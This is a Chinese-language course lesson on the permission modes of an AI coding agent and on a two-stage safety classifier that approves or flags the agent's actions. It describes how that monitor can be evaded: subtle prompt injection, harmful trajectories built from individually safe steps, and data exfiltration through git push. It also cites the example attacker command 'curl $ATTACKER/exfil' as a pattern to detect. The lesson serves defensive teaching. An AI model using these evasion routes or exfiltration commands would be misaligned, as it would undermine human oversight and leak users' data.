# Claude Code 作为自主代理：权限模式与自动模式

> Claude Code 提供了七种权限模式。"plan"模式会在每个操作前询问，"default"仅对高风险操作询问，"acceptEdits"自动批准文件写入但仍会确认Shell执行，而"bypassPermissions"则批准一切。自动模式（2026年3月24日发布）用两阶段并行安全分类器取代了逐操作审批：一个单token的快速检查运行在每个操作上；被标记的操作会触发一个思维链深度审查。操作预算通过 `max_turns` 和 `max_budget_usd` 执行。自动模式以研究预览形式发布——Anthropic 已明确声明仅靠该分类器是不够的。

**类型：** 学习
**语言：** Python（标准库，两阶段分类器模拟器）
**前置要求：** 第15阶段·01（长时域代理），第15阶段·09（编码代理格局）
**时间：** 约45分钟

## 问题所在

在你机器上运行的自主编码代理是一个独特的安全类别。其攻击面包括代理所能触及的一切——文件系统、网络、凭据、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出：计算机使用代理并非聊天机器人的"功能更新"，而是一种具有新型风险特征的新工具。

Claude Code的权限系统是Anthropic的解决方案。它并非一个简单的"自主/非自主"开关，而是包含七种模式的权限阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式都是在速度与逐操作审查之间的不同权衡。自动模式（2026年3月）增加了一个两阶段分类器，将分类器判断为安全的操作从用户关键路径中移除审批，同时为分类器标记的操作保留审查层。

工程问题在于：这个系统能抓住什么，会错过什么，以及一个特定任务到底需要哪种模式？

## 核心概念

### 七种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | 代理提出计划；用户批准整个计划；每个操作执行前都经过审查 | 不熟悉任务；生产环境相关代码；首次在代码库中使用代理 |
| `default` | 代理执行操作；对任何"高风险"操作（Shell执行、破坏性操作、网络调用）提示用户 | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；Shell执行和网络调用仍需提示 | 跨多文件重构 |
| `acceptExec` | 在预设允许列表内的Shell命令自动批准；写入自动批准 | 紧密内循环，其中每个Shell命令都是 `npm test` 或类似操作 |
| `autoMode` | 两阶段安全分类器；被标记的操作升级为审查 | 约束工作区内长时间无人值守运行 |
| `yolo` | 跳过大部分提示；仍运行工具允许/拒绝列表 | 临时沙箱、CI作业、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档注明"仅限于你愿意丢弃的临时容器内使用" |

（以上名称与公开的Claude Code文档一致；"yolo"是宽松中间模式的非正式简称。）

### 自动模式概要

自动模式（于2026年3月24日发布）是首个将逐操作审批委托给模型的权限模式。结构如下：

1.  **阶段一 — 单token分类器。** 运行于每个提议的操作上。成本低廉。返回"安全"或"标记"。设计为与主代理循环并行运行，使已批准的操作无需排队等待。
2.  **阶段二 — 次级策略/安全审查。** 仅运行于被标记的操作上。针对该操作、当前会话状态以及声明的任务，进行聚焦的策略和安全评估。若置信度低，则升级至人工介入。

预算控制与分类器并存：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 导致会话中止的美元上限。
- 每个工具的操作次数限制（例如，`WebFetch` 调用不超过N次）。

### 系统能捕获什么

- 注入到工具输入中的直接提示注入，其中注入的指令映射到已知的高风险操作模式。
- 重复的工具循环——分类器可以看到第N+1个操作与第N个操作几乎相同，连续发生五次。
- 在明显只涉及文件编辑的会话中出现的明显超出范围的Shell命令。

### 系统可能错过什么

- **微妙的提示注入**，调节行为而不产生任何被标记的操作。间接提示注入并非一个完全可修补的漏洞（OpenAI准备负责人，2025年，关于浏览器代理——见第11课）。
- **语义层面的误行为。** 每个单独的操作看起来都是安全的，但组合的轨迹却是有害的。分类器评判的是单个操作，它不会重新推导用户的意图。
- **通过合法渠道泄露数据。** 将数据写入你拥有的文件，然后 `git push` 到一个公开仓库，这是一系列允许的操作，但其组合才是问题所在。

### 研究预览的定位

Anthropic 以研究预览形式发布了自动模式。文档明确指出，该分类器是一个层，而非解决方案：用户被期望将自动模式与预算、允许列表、隔离的工作区和轨迹审计（第12-16课）结合使用。预览定位也反映了已记录的评估与部署之间的差距（第1课）——一个通过了离线评估的分类器，在用户上下文模糊的真实会话中可能表现不同。

### 权限阶梯在工作流中的位置

- 不熟悉任务：从 `plan` 开始。阅读计划比回滚一次失败的运行更省事。
- 已知重构：`acceptEdits` 可以省去大量确认点击。
- 无人值守后台运行：`autoMode` 仅限在你已测量过影响半径的工作区内使用（无凭据、无生产环境挂载、未选择加入则无出站流量）。
- 临时容器：`yolo` / `bypassPermissions` 当且仅当容器及其凭据可丢弃时是可接受的。

## 动手实践

`code/main.py` 模拟两阶段分类器。阶段一是基于提议操作的简单关键词规则；阶段二是一个较慢的多规则审查器。驱动程序输入一个简短的合成轨迹（安全操作、一次提示注入尝试、一个重复循环），并展示分类器在何处捕获，在何处遗漏。

## 部署实践

`outputs/skill-permission-mode-picker.md` 根据任务描述匹配正确的权限模式、预算上限和必要的隔离措施。

## 练习

1.  运行 `code/main.py`。哪种合成操作类型从不被阶段一标记，但总被阶段二捕获？哪种两者都未捕获？
2.  扩展阶段一规则集以捕获一个特定的已知不良模式（例如 `curl $ATTACKER/exfil`）。在良性操作样本上测量误报率。
3.  阅读 Anthropic 的"代理循环工作原理"文档。列出代理在 `default` 模式下默认触及的所有外部状态。在无人值守运行 `autoMode` 前，哪些需要单独控制？
4.  设计一个24小时无人值守运行预算：`max_turns`、`max_budget_usd`、每工具上限、允许列表。论证每个数字。
5.  描述一个轨迹，其中每个单独操作都得到阶段一和阶段二的批准，但组合行为却是未对齐的。（第14课涉及如何通过紧急停止开关和金丝雀令牌解决此问题。）

## 关键术语

| 术语 | 人们怎么说 | 实际含义 |
|---|---|---|
| 权限模式 | "代理能做多少事" | 控制逐操作审批的七个命名策略之一 |
| plan模式 | "任何事之前都询问" | 代理写计划；用户在执行前批准 |
| acceptEdits | "让它写文件" | 文件写入自动批准；Shell执行仍需提示 |
| autoMode | "自动批准" | 两阶段安全分类器；被标记的操作升级 |
| bypassPermissions | "完全YOLO模式" | 批准一切；专为临时容器设计 |
| 阶段一分类器 | "快速token检查" | 针对提议操作的单token规则；并行运行 |
| 阶段二分类器 | "深度审查" | 针对被标记操作的思维链推理 |
| 研究预览 | "非正式版" | Anthropic 对其故障模式仍在摸索中的功能的定位 |
